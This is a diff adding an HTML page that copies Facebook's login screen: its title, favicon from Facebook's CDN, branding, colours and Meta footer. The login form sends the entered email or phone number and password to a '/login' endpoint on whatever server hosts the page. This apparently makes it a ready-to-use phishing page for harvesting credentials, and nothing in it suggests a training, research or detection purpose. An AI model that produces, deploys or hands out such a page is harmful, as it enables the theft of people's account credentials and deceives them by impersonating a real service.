@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - log in or sign up</title>
+<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column}
+.header{background:#1877f2;padding:20px 0;text-align:center}
+.header h1{color:white;font-size:48px;font-weight:700;letter-spacing:-2px}
+.main{display:flex;align-items:center;justify-content:center;flex:1;padding:40px 20px;gap:80px;max-width:1000px;margin:0 auto;width:100%}
+.left{flex:1;max-width:500px}
+.left h2{font-size:56px;color:#1877f2;font-weight:700;line-height:1.1;margin-bottom:16px}
+.left p{font-size:28px;color:#1c1e21;line-height:1.3}
+.right{width:396px}
+.login-card{background:white;padding:24px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1)}
+.login-card input{width:100%;padding:16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
+.login-card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.login-btn{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
+.login-btn:hover{background:#166fe5}
+.forgot{text-align:center;display:block;color:#1877f2;font-size:14px;text-decoration:none;margin-bottom:20px}
+.forgot:hover{text-decoration:underline}
+.divider{border-top:1px solid #dadde1;margin:20px 0}
+.create-btn{display:block;margin:0 auto;padding:14px 24px;background:#42b72a;color:white;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
+.create-btn:hover{background:#36a420}
+.page-link{text-align:center;margin-top:28px;font-size:14px;color:#1c1e21}
+.page-link a{color:#1877f2;text-decoration:none;font-weight:600}
+.footer{background:white;padding:20px;text-align:center;font-size:12px;color:#737373;border-top:1px solid #dadde1}
+@media(max-width:768px){.main{flex-direction:column;gap:20px;text-align:center}.left h2{font-size:36px}.left p{font-size:20px}.right{width:100%;max-width:396px}}
+</style>
+</head>
+<body>
+<div class="main">
+    <div class="left">
+        <h2>facebook</h2>
+        <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+    <div class="right">
+        <div class="login-card">
+            <form action="/login" method="POST">
+                <input type="text" name="email" placeholder="Email address or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <div class="divider"></div>
+            <button class="create-btn">Create new account</button>
+        </div>
+        <p class="page-link"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+    </div>
+</div>
+<div class="footer">
+    English (UK) · Français · Español · Português · Deutsch · Italiano · हिन्दी · العربية<br>
+    Meta © 2024
+</div>
+</body>
+</html>
